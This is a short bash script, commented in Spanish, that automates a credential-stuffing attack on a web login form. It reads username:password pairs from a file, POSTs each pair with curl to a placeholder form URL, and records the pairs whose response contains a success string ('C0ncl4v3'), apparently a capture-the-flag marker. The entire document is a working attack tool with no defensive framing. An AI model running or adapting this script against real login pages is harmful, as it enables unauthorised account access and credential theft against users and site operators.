#!/bin/bash

# Archivo donde se guardarán los usuarios y contraseñas encontrados
archivo_salida="usuarios_contraseñas.txt"

# Iterar sobre cada línea en logins.txt
while IFS= read -r line; do
    # Extraer nombre de usuario y contraseña
    username=$(echo "$line" | cut -d':' -f1)
    password=$(echo "$line" | cut -d':' -f2)

    # Realizar la solicitud curl con los datos de usuario y contraseña
    respuesta=$(curl -s -X POST \
      -d "username=$username&password=$password" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      URL_DEL_FORMULARIO)

    # Verificar si la respuesta contiene el mensaje "C0ncl4v3"
    if echo "$respuesta" | grep -q "C0ncl4v3"; then
        # Guardar el nombre de usuario y la contraseña en el archivo de salida
        echo "Usuario: $username, Contraseña: $password" >> "$archivo_salida"
    fi

done < logins.txt
